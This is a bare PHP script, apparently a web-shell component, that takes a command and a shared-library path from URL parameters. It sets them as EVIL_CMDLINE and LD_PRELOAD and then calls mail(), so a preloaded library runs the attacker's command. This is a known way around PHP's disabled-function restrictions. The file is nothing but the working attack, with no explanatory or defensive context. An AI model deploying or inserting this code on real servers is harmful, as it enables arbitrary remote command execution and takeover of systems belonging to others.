<?php
    $cmd = $_GET["cmd"];
    putenv("EVIL_CMDLINE=" . $cmd);
    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
?>
